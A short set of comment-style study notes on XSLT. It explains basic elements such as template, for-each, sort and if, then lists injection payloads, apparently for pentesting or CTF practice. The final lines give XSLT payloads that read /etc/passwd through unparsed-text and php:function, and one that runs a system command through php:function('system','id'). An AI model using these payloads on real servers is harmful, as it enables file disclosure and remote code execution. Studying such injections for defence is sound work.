// eXtensible Stylesheet Language Transformation
//! Exploiting
//* definition
// its a language enabling the transformation of XML documents.
// it can select specific nodes from an XML document and change the XML structure.
//* xsl elements
// <xsl:template match='/something'> : applied on document called something
// <xsl:value-of select='name> : get the value of name from the something document
// <xsl:for-each select='fruit'> : loop over an xml node called fruit
// <xsl:sort select="color" order="descending" /> : must be put inside the for loop to determine how to sort
// <xsl:if test="size = 'Medium'"> body </xsl:if> : conditional statement
//* LFI
// <xsl:value-of select="unparsed-text('/etc/passwd', 'utf-8')" />
// <xsl:value-of select="php:function('file_get_contents','/etc/passwd')" />
//* RCE
// <xsl:value-of select="php:function('system','id')" />
